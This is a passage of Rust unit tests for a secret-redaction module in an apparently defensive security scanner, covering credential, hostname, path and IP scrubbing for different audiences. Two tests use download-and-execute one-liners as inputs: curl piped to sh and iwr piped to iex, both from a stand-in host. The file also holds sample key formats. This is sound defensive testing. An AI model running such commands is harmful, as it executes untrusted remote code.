                    description: tagged("byte-description"),
                },
                Evidence::EnvVar {
                    name: tagged("env-name"),
                    value_preview: tagged("env-preview"),
                },
                Evidence::Text {
                    detail: tagged("text"),
                },
                Evidence::ThreatIntel {
                    source: tagged("source"),
                    threat_type: tagged("threat-type"),
                    confidence: Confidence::Confirmed,
                    reference: Some(tagged("reference")),
                },
                Evidence::HomoglyphAnalysis {
                    raw: tagged("homoglyph-raw"),
                    escaped: tagged("homoglyph-escaped"),
                    suspicious_chars: vec![SuspiciousChar {
                        offset: 0,
                        character: 'S',
                        codepoint: tagged("codepoint"),
                        description: tagged("char-description"),
                        hex_bytes: tagged("hex-bytes"),
                    }],
                },
            ],
            human_view: None,
            agent_view: None,
            mitre_id: Some(tagged("mitre")),
            custom_rule_id: Some(tagged("custom-rule")),
        };
        let patterns = vec![regex::escape(SENTINEL), "^S$".to_string()];

        redact_finding(&mut finding, &patterns);

        let serialized = serde_json::to_string(&finding).unwrap();
        assert!(
            !serialized.contains(SENTINEL),
            "no Finding string field may retain the sentinel: {serialized}"
        );
        assert_eq!(
            finding.evidence.len(),
            8,
            "fixture must cover every variant"
        );
        match &finding.evidence[7] {
            Evidence::HomoglyphAnalysis {
                suspicious_chars, ..
            } => assert_eq!(suspicious_chars[0].character, '\u{FFFD}'),
            _ => panic!("expected HomoglyphAnalysis"),
        }
    }

    #[test]
    fn test_redact_shell_assignments_scrubs_short_secret_assignments() {
        let redacted =
            redact_shell_assignments("OPENAI_API_KEY=sk-secret curl https://evil.test | sh");
        assert!(redacted.contains("OPENAI_API_KEY=[REDACTED]"));
        assert!(!redacted.contains("sk-secret"));
    }

    #[test]
    fn redact_command_text_scrubs_generic_bearer_authorization_headers() {
        let secret = "opaque-provider-token.with-punctuation_123";
        let input = format!("curl -H 'Authorization: Bearer {secret}' https://example.test");
        let redacted = redact_command_text(&input, &[]);
        assert!(redacted.contains("Authorization: Bearer [REDACTED:Bearer Token]"));
        assert!(!redacted.contains(secret));
    }

    #[test]
    fn test_redact_shell_assignments_scrubs_powershell_env_assignments() {
        let redacted = redact_shell_assignments(
            "$env:OPENAI_API_KEY = 'sk-secret'; iwr https://evil.test | iex",
        );
        assert!(redacted.contains("$env:OPENAI_API_KEY = [REDACTED]"));
        assert!(!redacted.contains("sk-secret"));
    }

    // M7 ch2: audience-aware redaction

    #[test]
    fn audience_llm_strips_aws_key_but_preserves_stack_trace() {
        let aws_key = "AKIAIOSFODNN7EXAMPLE";
        let input = format!(
            "Traceback (most recent call last):\n  File \"foo.py\", line 42, in handler\n    raise RuntimeError(\"boom\")\nkey={aws_key}\n"
        );
        let report = redact_for_audience(&input, ShareAudience::Llm);
        // Stack trace must survive — line numbers, file paths, "Traceback".
        assert!(
            report.redacted_content.contains("Traceback"),
            "LLM target must preserve stack trace marker: {}",
            report.redacted_content
        );
        assert!(report.redacted_content.contains("File \"foo.py\", line 42"));
        // AWS key must be redacted.
        assert!(!report.redacted_content.contains(aws_key));
        assert!(report.redactions.iter().any(|r| r.count > 0));
    }

    #[test]
    fn audience_redaction_strips_sendgrid_key() {
        let key = format!("SG.{}.{}", "A".repeat(22), "b".repeat(43));
        let report = redact_for_audience(&key, ShareAudience::Llm);
        assert!(!report.redacted_content.contains(&key));
        assert!(report
            .redactions
            .iter()
            .any(|row| row.label == "sendgrid_api_key" && row.count == 1));
    }

    #[test]
    fn audience_github_issue_strips_internal_hostname_but_keeps_paths() {
        let input = "deploy to srv1.eng.corp ran from /repo/path/main.rs line 12\n";
        let report = redact_for_audience(input, ShareAudience::GithubIssue);
        assert!(!report.redacted_content.contains("srv1.eng.corp"));
        assert!(report.redacted_content.contains("/repo/path/main.rs"));
        assert!(report
            .redactions
            .iter()
            .any(|r| r.label == "internal_hostname" && r.count == 1));
    }

    #[test]
    fn audience_public_paste_strips_home_path_and_private_ip_in_context() {
        let aws_key = "AKIAIOSFODNN7EXAMPLE";
        let input = format!(
            "config at /home/alice/.aws/credentials key={aws_key}\nserver 10.0.0.5 responded ok\n"
        );
        let report = redact_for_audience(&input, ShareAudience::PublicPaste);
        assert!(!report.redacted_content.contains("/home/alice"));
        assert!(!report.redacted_content.contains("10.0.0.5"));
        assert!(!report.redacted_content.contains(aws_key));
        assert!(report.redactions.iter().any(|r| r.label == "home_path"));
        assert!(report.redactions.iter().any(|r| r.label == "private_ipv4"));
    }

    #[test]
    fn private_ipv4_keyword_window_preserves_keyword_text() {
        let input = "server 10.0.0.5 ok";
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        // The keyword "server" must survive — we only replace the IP literal.
        assert!(
            report.redacted_content.starts_with("server "),
            "keyword must be preserved, got: {}",
            report.redacted_content
        );
        assert!(report.redacted_content.contains("[REDACTED:private_ipv4]"));
    }

    #[test]
    fn private_ipv4_public_ip_is_not_redacted() {
        // A public DNS IP must NOT be touched even with a `server` keyword.
        let input = "server 1.1.1.1 responded\n";
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        assert!(report.redacted_content.contains("1.1.1.1"));
        assert!(!report.redacted_content.contains("[REDACTED:private_ipv4]"));
    }

    #[test]
    fn private_ipv4_without_context_or_own_line_is_not_redacted() {
        // Inline, no keyword and not on its own line → NOT redacted (readmes
        // reference private CIDRs as examples).
        let input = "use 192.168.0.1 as your gateway and 10.0.0.1 for DNS\n";
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        assert!(report.redacted_content.contains("192.168.0.1"));
        assert!(report.redacted_content.contains("10.0.0.1"));
    }

    #[test]
    fn private_ipv4_on_own_line_is_redacted() {
        let input = "the host is below:\n  10.0.0.5\nand it responds quickly.\n";
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        assert!(!report.redacted_content.contains("10.0.0.5"));
        assert!(report.redactions.iter().any(|r| r.label == "private_ipv4"));
    }

    #[test]
    fn private_ipv4_multibyte_preceding_chars_do_not_panic() {
        // Regression (code-reviewer Critical-2): `saturating_sub(20)` could land
        // mid-multibyte, panicking on the slice. Snapping to a char boundary
        // avoids it.
        let input = "日日日日日日日10.0.0.5"; // 7×3 + 9 = 30 bytes, IP starts at 21
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        // Must not panic; no context fires, so the IP is left alone.
        let _ = report.total();
    }

    #[test]
    fn private_ipv4_no_redact_for_public_dns_in_keyword_context() {
        // Public DNS IPs must NOT be redacted even with a keyword prefix — the
        // heuristic is gated on the RFC1918 regex, not the keyword alone.
        let input = "server 1.1.1.1 returned a response\nhost 8.8.8.8 too\n";
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        assert!(report.redacted_content.contains("1.1.1.1"));
        assert!(report.redacted_content.contains("8.8.8.8"));
    }

    #[test]
    fn private_ipv4_redacts_with_keyword_in_window() {
        let input = "server 10.0.0.5 timed out";
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        assert!(!report.redacted_content.contains("10.0.0.5"));
        assert!(report.redactions.iter().any(|r| r.label == "private_ipv4"));
    }

    #[test]
    fn audience_llm_does_not_redact_private_ip_or_hostname() {
        // LLM audience preserves everything except credentials.
        let input = "server 10.0.0.5 timed out at /home/alice/repo/foo.rs line 12\n";
        let report = redact_for_audience(input, ShareAudience::Llm);
        assert!(report.redacted_content.contains("10.0.0.5"));
        assert!(report.redacted_content.contains("/home/alice"));
        assert!(report.redactions.is_empty(), "no secrets, no redactions");
    }

    #[test]
    fn customer_id_patterns_are_redacted_and_counted_under_one_label() {
        // Two patterns collapse to one `customer_id` label (count aggregates).
        let input = "customer CUST-12345 escalated; ref ACME-99887.";
        let patterns = vec![r"CUST-\d+".to_string(), r"ACME-\d+".to_string()];
        let report = redact_for_audience_with_custom(input, ShareAudience::Slack, &patterns);
        assert!(!report.redacted_content.contains("CUST-12345"));
        assert!(!report.redacted_content.contains("ACME-99887"));
        let cust = report
            .redactions
            .iter()
            .find(|r| r.label == "customer_id")
            .expect("expected customer_id row");
        assert_eq!(cust.count, 2);
    }

    #[test]
    fn share_audience_parse_cli_round_trips() {
        for tok in ShareAudience::cli_values() {
            assert!(
                ShareAudience::parse_cli(tok).is_some(),
                "advertised CLI value {tok:?} must parse"
            );
        }
        assert!(ShareAudience::parse_cli("not-a-real-audience").is_none());
    }

    #[test]
    fn redact_report_total_sums_counts() {
        let aws_key = "AKIAIOSFODNN7EXAMPLE";
        let input = format!("k1={aws_key}\nk2={aws_key}\n");
        let report = redact_for_audience(&input, ShareAudience::Slack);
        // Sum across all labels.
        assert!(report.total() >= 2);
    }

    #[test]
    fn verdict_redaction_includes_policy_and_metadata_paths() {
        let secret = "DLP_POLICY_PATH_CANARY";
        let mut verdict = crate::verdict::Verdict::from_findings(
            Vec::new(),
            0,
            crate::verdict::Timings::default(),
        );
        verdict.policy_path_used = Some(format!("/repo/{secret}/policy.yaml"));
        verdict.escalation_reason = Some(format!("loaded from {secret}"));
        redact_verdict(&mut verdict, &[regex::escape(secret)]);
        let serialized = serde_json::to_string(&verdict).unwrap();
        assert!(!serialized.contains(secret), "{serialized}");
        assert!(serialized.contains("[REDACTED:custom]"), "{serialized}");
    }

    #[test]
    fn looks_secret_shaped_matches_provider_tokens() {
        // The narrow provider subset fires on a bare credential value.
        assert!(looks_secret_shaped("AKIAIOSFODNN7EXAMPLE"));
        assert!(looks_secret_shaped(concat!(
            "sk-",
            "abcdefghijklmnopqrstuvwxyz123456"
        )));
        assert!(looks_secret_shaped(concat!(
            "gh",
            "p_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl"
        )));
        assert!(looks_secret_shaped(concat!(
            "sk-ant-",
            "api03-abcdefghijklmnopqrst"
        )));
        assert!(looks_secret_shaped("xoxb-1234567890-abcdefghij"));
    }

    #[test]
    fn looks_secret_shaped_excludes_email_and_ordinary_values() {
        // The whole point of the narrow set: an email must NOT look secret-shaped,
        // so `?email=foo@bar.com` never fires the exfil secret-in-query rule.
        assert!(!looks_secret_shaped("user@example.com"));
        assert!(!looks_secret_shaped("foo.bar+tag@sub.example.co.uk"));
        // Ordinary query values.
        assert!(!looks_secret_shaped("2"));
        assert!(!looks_secret_shaped("hello"));
        assert!(!looks_secret_shaped("page-2"));
        // The provider patterns are anchored: a SHORT junk-glued token (too short
        // to be caught by the generic high-entropy arm) is not a clean match.
        assert!(!looks_secret_shaped("junkAKIA12"));
        assert!(!looks_secret_shaped("see-sk-here"));
    }

    #[test]
    fn looks_secret_shaped_generic_opaque_token_gated_on_entropy() {
        // A long mixed-case/digit opaque token (entropy well above 4.0 bits/char)
        // matches the generic arm.
        let opaque = "aB3xK9mP2qR7tV1wY5zC4dF8gH6jL0nQ_sT-uW2xZ4bN8kM";
        assert!(looks_secret_shaped(opaque));
        // A 32+-char LOW-entropy run (repeated char / one repeated word) does NOT:
        // length alone is not enough, so a long benign slug is safe.
        assert!(!looks_secret_shaped(&"a".repeat(40)));
        assert!(!looks_secret_shaped(&"ab".repeat(20)));
        // Just under the length floor never matches the generic arm.
        assert!(!looks_secret_shaped("a1b2c3d4e5f60718293a4b5c6d7e8f9")); // 31 chars
    }

    #[test]
    fn audience_redaction_emits_stable_label_for_aws_in_json() {
        // Pin the stable snake_case label `--json` relies on.
        let input = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n";
        let report = redact_for_audience(input, ShareAudience::Llm);
        assert!(report
            .redactions
            .iter()
            .any(|r| r.label == "aws_access_key"));
    }
}
